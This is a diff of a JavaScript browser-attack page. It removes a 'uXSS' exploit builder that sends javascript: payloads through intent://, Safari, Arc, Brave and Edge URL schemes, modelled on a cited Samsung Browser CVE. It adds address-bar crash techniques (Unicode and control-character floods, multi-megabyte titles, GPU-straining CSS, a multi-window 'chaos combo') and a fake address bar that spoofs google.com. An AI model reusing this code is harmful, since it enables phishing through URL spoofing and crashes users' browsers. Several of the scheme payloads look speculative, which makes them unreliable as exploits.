+    // TECHNIQUE 5: Zero-Width Characters
+    function exploitZeroWidth() {
+        addLog("👻 Injecting zero-width characters...", 'crash');
+        const zwj = '\u200D'; // Zero-Width Joiner
+        const zwnj = '\u200C'; // Zero-Width Non-Joiner
+        const zwsp = '\u200B'; // Zero-Width Space
+        const zeroWidth = (zwj + zwnj + zwsp).repeat(100);
+        createMaliciousWindow(zeroWidth + 'https://google.com', '<h1>Zero-Width Character Injection</h1>');
+        addLog("✓ 300 zero-width characters injected - invisible but consumes memory", 'crash');
+    }
+    
+    function exploitZeroWidthFlood() {
+        addLog("🌀 Flooding with 5000 zero-width characters...", 'crash');
+        const zeroWidth = '\u200D'.repeat(5000);
+        createMaliciousWindow(zeroWidth, '<h1>5000 Zero-Width Characters</h1><p>Renderer may crash</p>');
+        addLog("⚠️ 5000 zero-width chars - address bar may become blank", 'crash');
+    }
+    
+    // TECHNIQUE 6: Formatting Characters
+    function exploitFormattingChars() {
+        addLog("📝 Injecting formatting characters...", 'crash');
+        const formatting = '\u200E\u200F\u202A\u202B\u202C\u202D\u202E'.repeat(50);
+        createMaliciousWindow(formatting, '<h1>Formatting Character Flood</h1>');
+        addLog("✓ 350 formatting characters injected - bidi algorithm overload", 'crash');
+    }
+    
+    // TECHNIQUE 7: ANSI Escape Codes
+    function exploitANSIEscape() {
+        addLog("🖥️ Injecting ANSI escape codes...", 'crash');
+        const ansi = '\x1b[31mRED\x1b[0m \x1b[32mGREEN\x1b[0m \x1b[41mBG_RED\x1b[0m';
+        createMaliciousWindow(ansi, '<h1>ANSI Escape Code Injection</h1>');
+        addLog("✓ ANSI escape codes injected - console may interpret", 'info');
+    }
+    
+    // TECHNIQUE 8: Entity Expansion (Conceptual)
+    function exploitEntityExpansion() {
+        addLog("🔄 Simulating entity expansion attack...", 'crash');
+        addLog("⚠️ Modern browsers prevent XML entity expansion", 'info');
+        const longString = 'A'.repeat(100000);
+        createMaliciousWindow(longString, '<h1>Long String (Billion Laughs Simulated)</h1>');
+    }
+    
+    // TECHNIQUE 9: CSS Visual Spoof
+    function exploitCSSVisualSpoof() {
+        addLog("🎨 Injecting CSS to visually spoof address bar...", 'crash');
+        const win = window.open('', '_blank', 'width=800,height=600');
+        if (win) {
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>https://www.google.com</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        .fake-address-bar {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            right: 0;
+                            height: 45px;
+                            background: #fff;
+                            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+                            z-index: 999999;
+                            display: flex;
+                            align-items: center;
+                            padding: 0 10px;
+                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                        }
+                        .fake-url {
+                            background: #f1f3f4;
+                            border-radius: 20px;
+                            padding: 6px 15px;
+                            flex: 1;
+                            font-size: 14px;
+                            color: #202124;
+                        }
+                        .fake-lock {
+                            margin-right: 10px;
+                            color: #00aa66;
+                        }
+                        .content {
+                            margin-top: 50px;
+                            padding: 20px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="fake-address-bar">
+                        <span class="fake-lock">🔒</span>
+                        <span class="fake-url">https://www.google.com</span>
+                        <span>⋮</span>
+                    </div>
+                    <div class="content">
+                        <h1>🔥 ADDRESS BAR SPOOFED!</h1>
+                        <p>Fake address bar covers the real one</p>
+                        <p>You think you're on: <strong>https://www.google.com</strong></p>
+                        <button onclick="window.close()">Close</button>
+                    </div>
+                </body>
+                </html>
+            `);
+            addLog("✓ Fake address bar created - real address bar hidden", 'success');
+        }
+    }
+    
+    function exploitAdvancedCSS() {
+        addLog("🌀 Advanced CSS crash techniques...", 'crash');
+        const win = window.open('', '_blank', 'width=800,height=600');
+        if (win) {
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>${'A'.repeat(10000)}</title>
+                    <style>
+                        @keyframes crash {
+                            0% { transform: translate(0,0); }
+                            100% { transform: translate(99999px, 99999px); }
+                        }
+                        body::before {
+                            content: "${'X'.repeat(10000)}";
+                            position: fixed;
+                            top: -100px;
+                            left: -100px;
+                            width: 10000px;
+                            height: 10000px;
+                            background: linear-gradient(135deg, #f00, #0f0, #00f);
+                            animation: crash 0.01s infinite;
+                            backdrop-filter: blur(100px) brightness(1000%);
+                            pointer-events: none;
+                            z-index: 999999;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>🔥 CSS CRASH TECHNIQUE</h1>
+                    <p>Backdrop-filter + massive animation = address bar renderer crash</p>
+                </body>
+                </html>
+            `);
+            addLog("⚠️ Massive CSS injected - may crash GPU process", 'crash');
+        }
+    }
+    
+    // TECHNIQUE 10: Rare Unicode Planes
+    function exploitRareUnicode() {
+        addLog("🔢 Injecting rare Unicode plane characters...", 'crash');
+        // CJK Unified Ideographs Extension B (U+20000 to U+2A6DF)
+        const rareUnicode = '\u{20000}\u{2A600}\u{2B740}\u{2B820}\u{2CEA1}'.repeat(20);
+        createMaliciousWindow(rareUnicode, '<h1>Rare Unicode Plane Characters</h1><p>May cause font renderer crash</p>');
+        addLog("✓ Rare Unicode characters injected - font renderer may crash", 'crash');
+    }
+    
+    // TECHNIQUE 11: Extremely Long Title
+    function exploitLongTitle() {
+        addLog("📏 Injecting 2MB title...", 'crash');
+        const longTitle = 'https://google.com/' + 'A'.repeat(2_000_000);
+        addLog("⚠️ 2 million characters - address bar buffer may overflow", 'crash');
+        // Tidak langsung create window karena bisa freeze browser
         setTimeout(() => {
-            addLog("⚠️ Jika browser memiliki exported activity yang vulnerable, javascript: scheme akan execute di tab ini!", 'uxss');
-            addLog("💀 Payload: javascript:alert('uXSS on ' + origin)", 'uxss');
-        }, 2000);
-        
-        checkVulnerableActivities();
+            createMaliciousWindow(longTitle.substring(0, 10000), '<h1>Long Title Test</h1><p>Check if address bar crashed</p>');
+        }, 100);
     }
     
-    function exploitChromeIntentJS() {
-        addLog("💀 Attempting Chrome Intent with javascript: scheme...", 'uxss');
-        
-        // Payload similar to Samsung Browser exploit
-        const jsPayload = encodeURIComponent("alert('uXSS! Origin: ' + origin); console.log('Hacked!');");
-        const maliciousIntent = `intent://google.com#Intent;scheme=javascript;package=com.google.chrome;S.url=${jsPayload};end`;
-        
-        addLog(`📱 Malicious intent: ${maliciousIntent.substring(0, 100)}...`, 'uxss');
-        addLog("💀 Jika browser menerima javascript: scheme di intent, UXSS terjadi!", 'uxss');
-        
-        // Sequential attack seperti di POC Voorivex
-        addLog("🔄 Executing sequential attack (seperti POC Voorivex)", 'info');
-        
-        // Step 1: Buka target website
-        const target = 'https://www.google.com';
-        addLog(`📂 Step 1: Opening ${target}`, 'info');
-        const targetTab = window.open(target, '_blank');
-        
-        // Step 2: Send javascript payload
-        setTimeout(() => {
-            addLog(`💀 Step 2: Sending javascript: scheme to execute on ${target}`, 'uxss');
-            // window.location.href = maliciousIntent;
-        }, 2000);
+    function exploitExtremeLongTitle() {
+        addLog("🌀 Injecting 10MB title - DANGEROUS!", 'crash');
+        addLog("⚠️⚠️⚠️ This may CRASH your browser completely! ⚠️⚠️⚠️", 'crash');
+        const confirmed = confirm("10MB title injection - Browser may crash!\nContinue?");
+        if (confirmed) {
+            const extremeTitle = 'A'.repeat(10_000_000);
+            createMaliciousWindow(extremeTitle.substring(0, 10000), '<h1>Extreme Title Test</h1>');
+            addLog("💀 10MB title sent - browser may become unresponsive", 'crash');
+        }
     }
     
-    // EXPLOIT 2: Safari URL Scheme
-    function exploitSafariScheme() {
-        addLog("🍎 Attempting Safari URL Scheme uXSS...", 'info');
-        
-        const isSafari = currentBrowser === 'Safari';
-        if (!isSafari) addLog("⚠️ This exploit is most effective on Safari", 'warning');
-        
-        // Safari specific schemes
-        const schemes = [
-            'x-apple-extension://com.apple.Safari/extension?url=javascript:alert("uXSS")',
-            'x-web-search://?query=javascript:alert(document.cookie)',
-            'safari://open?url=javascript:alert(origin)'
-        ];
-        
-        addLog(`📂 Safari schemes to test: ${schemes.join(', ')}`, 'info');
-        
-        // Buka target
-        const target = 'https://www.apple.com';
-        addLog(`🎯 Opening target: ${target}`, 'info');
-        window.open(target, '_blank');
-        
-        addLog("💀 Jika Safari menerima javascript: scheme di URL handler, UXSS terjadi!", 'uxss');
-        checkVulnerableActivities();
+    // TECHNIQUE 12: Emoji + Combining Characters
+    function exploitEmojiBomb() {
+        addLog("😀 Injecting emoji + combining characters...", 'crash');
+        const emoji = '👨‍👩‍👧‍👦'.repeat(100);
+        createMaliciousWindow(emoji, '<h1>Emoji ZWJ Sequence Bomb</h1>');
+        addLog("✓ 100 emoji ZWJ sequences injected - grapheme cluster parser overload", 'crash');
     }
     
-    // EXPLOIT 3: ARC Browser Deep Link
-    function exploitArcDeepLink() {
-        addLog("🌀 Attempting ARC Browser Deep Link uXSS...", 'info');
-        
-        const isArc = currentBrowser === 'Arc';
-        if (isArc) addLog("✅ Arc browser detected - testing deep links", 'success');
-        
-        // ARC specific deep links
-        const arcLinks = [
-            'arc://newtab?url=javascript:alert("Arc uXSS")',
-            'arc-deeplink://open?url=javascript:alert(origin)',
-            'arc://boost?code=javascript:alert(document.cookie)'
-        ];
-        
-        addLog(`📂 ARC deep links to test: ${arcLinks.join(', ')}`, 'info');
-        
-        // Buka target ARC page
-        window.open('arc://newtab', '_blank');
-        
-        setTimeout(() => {
-            addLog("💀 Jika ARC memiliki exported activity yang vulnerable, kita bisa UXSS!", 'uxss');
-            addLog("📚 Mirip dengan BixbySBrowserLauncherActivity di Samsung Browser", 'info');
-        }, 1000);
-        
-        checkVulnerableActivities();
+    function exploitEmojiFlood() {
+        addLog("🌀 Injecting 1000 emojis...", 'crash');
+        const emojis = '😀😁😂🤣😃😄😅😆😉😊'.repeat(100);
+        createMaliciousWindow(emojis, '<h1>1000 Emoji Flood</h1>');
+        addLog("⚠️ 1000 emojis - font renderer may crash", 'crash');
     }
     
-    // EXPLOIT 4: Brave Rewards
-    function exploitBraveRewards() {
-        addLog("🦁 Attempting Brave Rewards uXSS...", 'info');
-        
-        const isBrave = currentBrowser === 'Brave';
-        if (isBrave) addLog("✅ Brave browser detected", 'success');
-        
-        // Brave specific URLs
-        const braveLinks = [
-            'brave://rewards?url=javascript:alert("Brave uXSS")',
-            'brave://wallet?code=javascript:alert(origin)',
-            'brave://settings?search=javascript:alert(document.cookie)'
-        ];
-        
-        addLog(`📂 Brave internal pages: ${braveLinks.join(', ')}`, 'info');
-        
-        // Buka Brave internal page
-        window.open('brave://rewards', '_blank');
-        
-        addLog("💀 Jika Brave memiliki exported activity tanpa validasi yang tepat, UXSS mungkin!", 'uxss');
-        checkVulnerableActivities();
+    // TECHNIQUE 13: Control Characters
+    function exploitControlChars() {
+        addLog("⌫ Injecting control characters (BS, DEL, CAN)...", 'crash');
+        const controlChars = '\x08\x7F\x18\x1A\x1B\x1C\x1D\x1E\x1F'.repeat(100);
+        createMaliciousWindow(controlChars + 'https://google.com', '<h1>Control Character Injection</h1>');
+        addLog("✓ 900 control characters injected - address bar rendering may corrupt", 'crash');
     }
     
-    // EXPLOIT 5: Edge Collections
-    function exploitEdgeCollections() {
-        addLog("📚 Attempting Edge Collections uXSS...", 'info');
-        
-        const isEdge = currentBrowser === 'Edge';
-        if (isEdge) addLog("✅ Edge browser detected", 'success');
-        
-        // Edge specific handlers
-        const edgeLinks = [
-            'microsoft-edge:https://google.com',
-            'edge://collections?url=javascript:alert("Edge uXSS")',
-            'ms-edge://newtab?code=javascript:alert(origin)'
-        ];
-        
-        addLog(`📂 Edge handlers: ${edgeLinks.join(', ')}`, 'info');
-        
-        window.open('edge://collections', '_blank');
-        
-        addLog("💀 Edge memiliki PDF viewer dan Collections yang mungkin vulnerable!", 'uxss');
-        checkVulnerableActivities();
+    // TECHNIQUE 14: Mixed Scripts
+    function exploitMixedScripts() {
+        addLog("🔄 Injecting mixed RTL/LTR scripts...", 'crash');
+        const mixed = 'Google.com مرحبا שלום こんにちは 你好 चार्ल्स 안녕하세요';
+        createMaliciousWindow(mixed, '<h1>Mixed Script Direction Attack</h1>');
+        addLog("✓ Mixed scripts injected - bidi algorithm may crash", 'crash');
     }
     
-    // EXPLOIT 6: Cross Browser Intent
-    function exploitCrossBrowserIntent() {
-        addLog("🔄 Attempting Cross-Browser Intent uXSS...", 'info');
-        addLog("📚 Teknik yang sama dengan Voorivex Team untuk Samsung Browser", 'info');
+    // TECHNIQUE 15: Invisible Characters
+    function exploitInvisibleChars() {
+        addLog("👻 Injecting invisible tag characters...", 'crash');
+        const invisible = '\u{E0000}\u{E0001}\u{E0002}\u{E007F}'.repeat(100);
+        createMaliciousWindow(invisible, '<h1>Invisible Tag Character Injection</h1>');
+        addLog("✓ 400 invisible characters injected - consume memory without display", 'crash');
+    }
+    
+    // Custom Injection
+    function injectCustomTitle() {
+        const title = document.getElementById('customTitle').value;
+        if (!title) {
+            addLog("❌ Please enter a custom title", 'error');
+            return;
+        }
+        const method = document.getElementById('injectionMethod').value;
         
-        // Universal intent untuk macOS
-        const bundleIds = {
-            'Arc': 'company.thebrowser.Browser',
-            'Chrome': 'com.google.Chrome',
-            'Safari': 'com.apple.Safari',
-            'Brave': 'com.brave.Browser',
-            'Edge': 'com.microsoft.edgemac'
-        };
+        addLog(`🔨 Injecting custom title using method: ${method}`, 'info');
+        addLog(`📝 Title: ${title.substring(0, 100)}${title.length > 100 ? '...' : ''}`, 'crash');
         
-        const bundleId = bundleIds[currentBrowser] || 'com.google.Chrome';
-        const jsPayload = encodeURIComponent("alert('Universal XSS! Origin: ' + origin);");
+        switch(method) {
+            case 'title':
+                createMaliciousWindow(title);
+                break;
+            case 'iframe':
+                const iframe = document.createElement('iframe');
+                iframe.srcdoc = `<html><head><title>${title.replace(/</g, '&lt;')}</title></head><body><h1>Iframe Title Injection</h1></body></html>`;
+                document.body.appendChild(iframe);
+                addLog("✓ Iframe with malicious title created", 'success');
+                setTimeout(() => iframe.remove(), 5000);
+                break;
+            case 'popup':
+                createMaliciousWindow(title);
+                break;
+            case 'history':
+                const win = window.open('about:blank', '_blank');
+                win.document.title = title;
+                win.history.pushState({}, title, '#injected');
+                addLog("✓ History.pushState with malicious title", 'success');
+                break;
+            case 'all':
+                createMaliciousWindow(title);
+                const iframe2 = document.createElement('iframe');
+                iframe2.srcdoc = `<html><head><title>${title.replace(/</g, '&lt;')}</title></head></html>`;
+                document.body.appendChild(iframe2);
+                const win2 = window.open('about:blank', '_blank');
+                win2.document.title = title;
+                win2.history.pushState({}, title, '#injected');
+                setTimeout(() => iframe2.remove(), 5000);
+                addLog("✓ All methods combined - maximum chaos!", 'crash');
+                break;
+        }
+    }
+    
+    // Chaos Combo - All techniques at once
+    function injectChaosCombo() {
+        addLog("💀💀💀 EXECUTING CHAOS COMBO - ALL TECHNIQUES 💀💀💀", 'crash');
+        addLog("⚠️ This may CRASH your browser completely!", 'crash');
         
-        const intentURL = `intent://example.com#Intent;scheme=https;package=${bundleId};S.url=javascript:${jsPayload};end`;
+        const confirmed = confirm("CHAOS COMBO - Browser will likely crash!\nContinue?");
+        if (!confirmed) return;
         
-        addLog(`📱 Generated intent: ${intentURL.substring(0, 100)}...`, 'info');
-        addLog(`🎯 Target bundle: ${bundleId}`, 'info');
+        const chaosTitle = 
+            '\x00'.repeat(100) + 
+            '\u202E'.repeat(50) + 
+            '\uD800'.repeat(100) + 
+            '\u200D'.repeat(200) + 
+            '\x1b[31mANSI\x1b[0m'.repeat(50) +
+            '\u{20000}'.repeat(50) +
+            '👨‍👩‍👧‍👦'.repeat(50) +
+            '\x08\x7F'.repeat(50) +
+            'A'.repeat(100000);
         
-        // Sequential attack seperti POC Voorivex
-        const targetSites = ['https://www.google.com', 'https://www.github.com', 'https://www.twitter.com'];
-        
-        addLog("🔄 Executing sequential UXSS attack...", 'uxss');
-        
-        targetSites.forEach((site, index) => {
+        // Open multiple windows with chaos
+        for (let i = 0; i < 5; i++) {
             setTimeout(() => {
-                addLog(`📍 Opening ${site}`, 'info');
-                window.open(site, '_blank');
-            }, index * 2000);
-            
-            setTimeout(() => {
-                addLog(`💀 Sending javascript: payload to ${site}`, 'uxss');
-            }, index * 2000 + 1000);
-        });
+                createMaliciousWindow(chaosTitle.substring(0, 1000), `<h1>CHAOS WINDOW ${i+1}</h1><p>Address bar may be blank/crashed</p>`);
+            }, i * 500);
+        }
+        
+        // Also inject via iframe
+        const iframe = document.createElement('iframe');
+        iframe.srcdoc = `<html><head><title>${chaosTitle.substring(0, 500)}</title></head><body><h1>Iframe Chaos</h1></body></html>`;
+        document.body.appendChild(iframe);
+        
+        addLog("💀 CHAOS COMBO EXECUTED - Check your address bar(s)", 'crash');
+        addLog("⚠️ If browser crashed, techniques were successful", 'crash');
+        
+        setTimeout(() => iframe.remove(), 10000);
     }
     
-    // Custom uXSS Builder
-    function buildUXSSExploit() {
-        const browser = document.getElementById('targetBrowser').value;
-        const targetSite = document.getElementById('targetSite').value;
-        const payload = document.getElementById('uxssPayload').value;
-        
-        addLog(`🔨 Building custom uXSS exploit for ${browser}`, 'info');
-        addLog(`🎯 Target website: ${targetSite}`, 'info');
-        addLog(`💉 Payload: ${payload.substring(0, 100)}${payload.length > 100 ? '...' : ''}`, 'uxss');
-        
-        const encodedPayload = encodeURIComponent(payload);
-        
-        // Build exploits for each browser (Samsung-style)
-        const exploits = {
-            'chrome': `intent://${targetSite.replace('https://', '')}#Intent;scheme=https;package=com.google.Chrome;S.extra_access_url=javascript:${encodedPayload};B.extra_by_capsule=true;end`,
-            'safari': `x-apple-extension://com.apple.Safari/extension?url=javascript:${encodedPayload}`,
-            'arc': `arc-deeplink://open?url=javascript:${encodedPayload}`,
-            'brave': `brave://rewards?url=javascript:${encodedPayload}`,
-            'edge': `microsoft-edge:javascript:${encodedPayload}`,
-            'all': `intent://${targetSite.replace('https://', '')}#Intent;scheme=https;S.url=javascript:${encodedPayload};end`
-        };
-        
-        const exploit = exploits[browser] || exploits['all'];
-        
-        addLog("📝 Generated exploit (Samsung Browser style):", 'info');
-        addLog(exploit.substring(0, 200) + (exploit.length > 200 ? '...' : ''), 'code');
-        
-        // Execute exploit
-        addLog("🚀 Executing uXSS exploit...", 'uxss');
-        
-        // Step 1: Open target site (seperti di POC Voorivex)
-        addLog(`📂 Step 1: Opening ${targetSite}`, 'info');
-        const targetTab = window.open(targetSite, '_blank');
-        
-        // Step 2: Send javascript payload via intent
-        setTimeout(() => {
-            addLog(`💀 Step 2: Sending javascript scheme to execute on ${targetSite}`, 'uxss');
-            addLog("⚠️ Jika browser memiliki exported activity yang vulnerable seperti Samsung Browser, UXSS terjadi!", 'warning');
-            // window.location.href = exploit;
-        }, 1500);
-        
-        checkVulnerableActivities();
-    }
-    
-    // Auto UXSS - Sequential Attack (Seperti POC Voorivex)
-    function executeAutoUXSS() {
-        addLog("⚡ Starting AUTO uXSS - Sequential Attack", 'uxss');
-        addLog("📚 Berdasarkan POC Voorivex untuk Samsung Browser", 'info');
-        
-        const targetSites = [
-            'https://www.google.com',
-            'https://www.github.com',
-            'https://www.reddit.com',
-            'https://www.wikipedia.org',
-            'https://www.amazon.com'
-        ];
-        
-        const payload = "alert('uXSS! Hacked on ' + origin); console.log('Universal XSS successful');";
-        const encodedPayload = encodeURIComponent(payload);
-        
-        addLog(`🎯 Target sites: ${targetSites.join(', ')}`, 'info');
-        
-        // Sequential attack seperti di Voorivex POC
-        targetSites.forEach((site, index) => {
-            // Step 1: Open site (seperti open google.com di POC)
-            setTimeout(() => {
-                addLog(`[${index + 1}] 📂 Opening ${site}`, 'info');
-                const tab = window.open(site, '_blank');
-                
-                // Step 2: Send javascript payload (seperti second intent di POC)
-                setTimeout(() => {
-                    addLog(`[${index + 1}] 💀 Sending javascript: payload to ${site}`, 'uxss');
-                    // In real exploit, this would be an intent:// URL
-                    addLog(`[${index + 1}] 📱 Intent: javascript:${encodedPayload.substring(0, 50)}...`, 'info');
-                }, 800);
-            }, index * 2500);
-        });
-        
-        // Summary
-        setTimeout(() => {
-            addLog("📊 uXSS Attack Sequence Complete", 'success');
-            addLog("💀 Jika browser memiliki exported activity yang vulnerable, semua tab di atas akan terkena XSS!", 'uxss');
-            addLog("📚 CVE-2025-58485: Samsung Browser's BixbySBrowserLauncherActivity → SBrowserMainActivity", 'info');
-        }, targetSites.length * 2500 + 1000);
-    }
-    
-    // Run initial checks
-    setTimeout(() => {
-        checkVulnerableActivities();
-        
-        addLog("", 'info');
-        addLog("📚 REFERENCE - Voorivex Team (CVE-2025-58485):", 'info');
-        addLog("   Path: BixbySBrowserLauncherActivity → handleIntent → handleGoals → handleAccessWebsite → SBrowserMainActivity → accessWebsite → loadUrl", 'info');
-        addLog("   Vulnerability: Extra_access_url parameter bisa diisi javascript: scheme", 'info');
-        addLog("   Result: UXSS on any website browser can access!", 'uxss');
-        addLog("", 'info');
-        
-        addLog("🎯 macOS Adaptation - Potential Vulnerable Components:", 'info');
-        addLog("   • Chrome: Custom Tabs, Intent filters, chrome:// pages", 'info');
-        addLog("   • Safari: URL scheme handlers, x-apple-extension://", 'info');
-        addLog("   • ARC: Deep links, arc://, Boost injection (CVE-2024-45489)", 'info');
-        addLog("   • Brave: Rewards, Wallet, brave:// internal pages", 'info');
-        addLog("   • Edge: Collections, PDF viewer, microsoft-edge://", 'info');
-    }, 500);
+    // Initial log
+    addLog("🔥 15+ Illegal Character Injection Techniques Ready", 'info');
+    addLog("💀 NULL bytes, Surrogates, Zero-Width, RTL, Overlong UTF, etc.", 'info');
+    addLog("⚠️ Click any button to inject - watch address bar behavior", 'warning');
 </script>
 </body>
 </html>
